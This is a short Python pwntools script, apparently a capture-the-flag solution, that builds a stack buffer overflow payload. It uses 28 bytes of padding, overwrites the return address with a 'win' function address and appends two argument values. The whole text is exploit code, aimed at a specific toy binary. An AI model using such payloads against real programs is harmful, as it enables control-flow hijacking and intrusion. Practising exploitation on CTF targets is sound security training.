from pwn import *


padding = 'A'*28 
win = p32(0x80491c2)
ebp = 'B'*4
arg1 = p64(0x14b4da55)
arg2 = p32(0xf00db4be)

payload = padding
payload += win
payload += ebp
payload += arg1
payload += arg2

print payload
